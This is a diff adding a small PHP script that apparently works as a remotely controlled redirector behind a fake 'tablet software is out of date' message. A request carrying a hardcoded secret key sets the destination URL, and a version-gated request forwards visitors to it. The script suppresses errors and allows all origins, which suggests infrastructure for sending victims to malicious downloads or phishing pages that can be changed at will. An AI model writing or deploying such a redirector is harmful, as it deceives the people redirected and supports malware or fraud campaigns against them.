@@ -1,0 +1,41 @@
+<?php
+error_reporting(0);
+ini_set('display_errors', 0);
+
+header('Access-Control-Allow-Origin: *');
+
+if($_POST['action'] == 'save' && $_POST['key'] == 'e12a465aefc5173862ea2375fded407e5ce1b3d3b3e814e530731569b1d2a16a')
+{
+    if(file_put_contents("location.t", $_POST["newdest"]) !== false)
+    {
+        echo "success";
+    } else {
+        echo "fail";
+    }
+
+    die();
+} else {
+
+    switch($_GET['action'])
+    {
+        case 'doload':
+            if($_GET['version'] == '060815')
+            {
+                $file = file_get_contents('./location.t', true);
+                header("Location: " . $file);
+                die();
+            }
+        break;
+        
+        case 'geturl':
+			echo file_get_contents('./location.t', true);
+        break;
+        
+        default:
+            echo "Your tablet software is currently out of date.";
+			die();
+
+    }
+}
+
+?>
